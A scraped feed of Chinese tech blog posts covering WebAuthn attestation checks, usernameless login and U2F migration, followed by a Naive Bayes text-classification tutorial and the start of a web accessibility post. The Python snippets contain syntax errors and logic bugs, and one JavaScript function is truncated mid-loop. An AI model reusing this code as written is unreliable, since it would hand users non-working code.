自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 